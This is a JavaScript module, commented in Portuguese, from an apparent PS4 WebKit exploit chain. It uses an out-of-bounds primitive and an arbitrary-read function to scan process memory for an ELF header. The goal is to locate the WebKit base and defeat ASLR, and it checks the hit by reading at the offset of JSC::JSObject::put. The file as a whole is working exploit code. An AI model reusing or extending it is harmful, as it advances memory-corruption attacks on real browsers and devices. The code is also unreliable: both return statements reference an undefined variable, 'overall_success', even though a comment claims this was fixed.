// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v32.2: Varredura de Memória com Clone Corrigido)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read, 
} from '../core_exploit.mjs'; // Deve ser a versão "v31" que tem arb_read async com reset interno
import { WEBKIT_LIBRARY_INFO, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v32.2_WebKitBaseScan_CorrectedClone";

// !!! IMPORTANTE: VOCÊ PRECISA DEFINIR ESTES VALORES PARA O PS4 !!!
const SCAN_START_ADDRESS_STR = "0x800000000"; // Exemplo
const SCAN_END_ADDRESS_STR   = "0x800100000"; // Exemplo (reduzido para teste mais rápido)
const SCAN_STEP_SIZE         = 0x1000;      // Exemplo: 4KB

const ELF_MAGIC_DWORD = 0x464C457F; // "\x7FELF" em little-endian

let testLog_v32_2 = []; // Log específico para esta versão

// Funções auxiliares para comparação de AdvancedInt64 (mantidas da v32.1)
function adv64_lessThan(a, b) {
    if (a.high() < b.high()) return true;
    if (a.high() === b.high() && a.low() < b.low()) return true;
    return false;
}

function adv64_greaterThanOrEquals(a, b) {
    if (a.high() > b.high()) return true;
    if (a.high() === b.high() && a.low() >= b.low()) return true;
    return false;
}


function recordScanResult_v32_2(address, valueRead, isCandidate, verification = "") {
    const entry = { 
        address: address.toString(true), 
        valueRead: typeof valueRead === 'number' ? toHex(valueRead) : (isAdvancedInt64Object(valueRead) ? valueRead.toString(true) : String(valueRead)),
        isCandidate, 
        verification 
    };
    testLog_v32_2.push(entry);
    if (isCandidate) {
        logS3(`[CANDIDATO ENCONTRADO!] Endereço: ${entry.address}, Magic Lido: ${entry.valueRead}. ${verification}`, "vuln", FNAME_MODULE_V28);
    }
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.scanForWebKitBaseCorrectedClone`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Varredura de Memória Corrigida (Clone) (v32.2) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v32_2 = [];
    let overall_test_success = false; 
    let errorCapturedMain = null;
    let final_message = "Varredura iniciada...";

    const scan_start_addr = new AdvancedInt64(SCAN_START_ADDRESS_STR);
    const scan_end_addr = new AdvancedInt64(SCAN_END_ADDRESS_STR);

    if (adv64_greaterThanOrEquals(scan_start_addr, scan_end_addr) || SCAN_STEP_SIZE <= 0) {
        logS3("Faixa de varredura ou tamanho do passo inválidos. Abortando.", "error", FNAME_CURRENT_TEST);
        final_message = "Configuração de varredura inválida.";
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído (Erro de Config) ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final Varredura de Memória (v32.2): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        return { errorCapturedMain, overall_success, final_message, test_log_details: testLog_v32_2 };
    }

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Ambiente OOB inicial não pôde ser configurado.");
        logS3("PASSO GLOBAL: Ambiente OOB inicial configurado.", "info", FNAME_CURRENT_TEST);
        logS3(`Iniciando varredura de ${scan_start_addr.toString(true)} a ${scan_end_addr.toString(true)} com passo ${toHex(SCAN_STEP_SIZE)}...`, "warn", FNAME_CURRENT_TEST);

        // CORREÇÃO AQUI: Criar nova instância para current_scan_address
        let current_scan_address = new AdvancedInt64(scan_start_addr.low(), scan_start_addr.high());
        let candidatesFound = 0;

        while (adv64_lessThan(current_scan_address, scan_end_addr)) {
            let read_dword = null;
            let isCandidate = false;
            let verification_info = "";

            try {
                read_dword = await arb_read(current_scan_address, 4); 
                
                if (typeof read_dword === 'number' && read_dword === ELF_MAGIC_DWORD) {
                    isCandidate = true;
                    candidatesFound++;
                    overall_test_success = true; 
                    
                    const funcOffsetCheckStr = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
                    const funcOffsetCheck = new AdvancedInt64(funcOffsetCheckStr);
                    const addrToVerify = current_scan_address.add(funcOffsetCheck); // Assume que .add() existe e funciona
                    logS3(`    CANDIDATO ELF em ${current_scan_address.toString(true)}! Verificando offset JSC::JSObject::put em ${addrToVerify.toString(true)}...`, "vuln", FNAME_CURRENT_TEST);
                    try {
                        const funcStartBytes = await arb_read(addrToVerify, 8);
                        verification_info = `Offset JSC::JSObject::put lido: ${funcStartBytes.toString(true)}`;
                        logS3(`      ${verification_info}`, "leak", FNAME_CURRENT_TEST);
                    } catch (e_verify) {
                        verification_info = `ERRO ao verificar offset de função: ${e_verify.message}`;
                        logS3(`      ${verification_info}`, "error", FNAME_CURRENT_TEST);
                    }
                }
                if (isCandidate || (typeof read_dword === 'number' && read_dword !== 0 && read_dword !== 0xFFFFFFFF && (read_dword & 0xFF000000) !== 0xFF000000) ) { // Loga candidatos ou valores não triviais
                    recordScanResult_v32_2(current_scan_address, read_dword, isCandidate, verification_info);
                }

            } catch (e_read) {
                // Silencioso para a maioria dos erros de leitura para não poluir
            }
            
            // Condição de parada para exemplo longo pode ser reativada se necessário
            // if (candidatesFound >= 3 && SCAN_END_ADDRESS_STR === "0x8FFFFFFFF") { break; }

            current_scan_address = current_scan_address.add(SCAN_STEP_SIZE); // Assume que .add() existe
            if (adv64_lessThan(current_scan_address, scan_start_addr)) { // Overflow check
                logS3("Overflow detectado no endereço de varredura. Interrompendo.", "critical", FNAME_CURRENT_TEST);
                break;
            }
             if (candidatesFound === 0 && current_scan_address.low() % (SCAN_STEP_SIZE * 200) === 0) { // Log de progresso menos frequente
                 logS3(`  Progresso da varredura: ${current_scan_address.toString(true)}... Nenhum candidato ainda.`, "info", FNAME_CURRENT_TEST);
            }
            await PAUSE_S3(1); // Pausa mínima
        }

        if (candidatesFound > 0) {
            final_message = `Varredura concluída. ${candidatesFound} candidato(s) a base da WebKit encontrado(s).`;
        } else {
            final_message = "Varredura concluída. Nenhum candidato a base da WebKit encontrado com a assinatura ELF na faixa especificada.";
            // overall_test_success já é false por padrão se nenhum candidato for encontrado.
        }
        logS3(final_message, overall_test_success ? "vuln" : "warn", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "SCAN OK" : "SCAN N/FOUND"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false; 
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        // Corrigido o log final para usar a variável correta
        logS3(`Resultado Final Varredura de Memória (v32.2): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        testLog_v32_2.filter(r => r.isCandidate).forEach(res => { 
            logS3(`  [CANDIDATO] Addr=${res.address}, Lido=${res.valueRead}, Verificação='${res.verification}'`, "vuln", FNAME_MODULE_V28 + ".Candidates");
        });
    }
    return { errorCapturedMain, overall_success, final_message, scan_results: testLog_v32_2.filter(r => r.isCandidate) };
}
